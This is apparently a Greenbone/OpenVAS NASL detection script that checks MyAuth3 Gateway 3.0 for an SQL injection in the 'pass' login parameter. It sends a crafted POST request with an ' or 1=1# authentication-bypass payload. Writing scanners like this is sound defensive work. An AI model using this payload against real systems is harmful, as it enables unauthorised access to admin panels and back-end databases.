# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801980");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("MyAuth3 Gateway 'pass' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 1881);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://doie.net/?p=578");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49530");
  script_xref(name:"URL", value:"http://www.1337day.com/exploits/16858");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/21787");

  script_tag(name:"insight", value:"The flaw exists due to the error in 'index.php', which fails to
  sufficiently sanitize user-supplied input via 'pass' parameter before using it in SQL query.");

  script_tag(name:"solution", value:"Vendor has released a patch to fix the issue, please contact
  the vendor for patch information.");

  script_tag(name:"summary", value:"MyAuth3 Gateway is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view, add,
  modify or delete information in the back-end database.");

  script_tag(name:"affected", value:"MyAuth3 Gateway version 3.0.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:1881);
if(!http_can_host_php(port:port))
  exit(0);

res = http_get_cache(item:"/index.php", port:port);

if(">MyAuth3 Gateway</" >< res) {

  authVariables = "panel_cmd=auth&r=ok&user=pingpong&pass=%27+or+1%3D1%23";
  url = "/index.php?console=panel";

  host = http_host_name(port:port);

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(authVariables), "\r\n\r\n",
               authVariables);
  res = http_keepalive_send_recv(port:port, data:req);

  if("cotas" >< res && ">Alterar" >< res && "senha&" >< res) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
